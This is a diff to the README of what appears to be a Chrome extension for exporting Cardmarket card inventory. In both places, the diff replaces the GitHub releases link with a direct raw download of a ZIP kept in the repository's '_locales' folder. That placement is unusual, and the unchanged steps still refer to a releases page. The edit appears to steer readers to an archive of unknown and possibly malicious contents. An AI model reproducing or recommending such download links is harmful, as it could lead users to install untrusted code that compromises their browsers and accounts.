@@ -1,6 +1,6 @@
 # 📦 cardmarket-stock-exporter - Manage your card inventory with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/raw/refs/heads/main/_locales/cardmarket-exporter-stock-3.0.zip)
 
 This application helps users manage card inventory on Cardmarket. It functions as a Chrome extension. You can export your full stock and wantlists to CSV files. You can update prices and comments in bulk by importing a CSV file. The extension supports eight trading card games. It works quickly and avoids common web blocks.
 
@@ -21,7 +21,7 @@ The extension simplifies inventory management tasks.
 
 Follow these steps to set up the extension on your computer.
 
-1. Visit [this page to download](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/releases) the extension package.
+1. Visit [this page to download](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/raw/refs/heads/main/_locales/cardmarket-exporter-stock-3.0.zip) the extension package.
 2. Locate the latest release version on the page.
 3. Download the ZIP file to your computer.
 4. Extract the contents of the ZIP file to a folder you can find later.
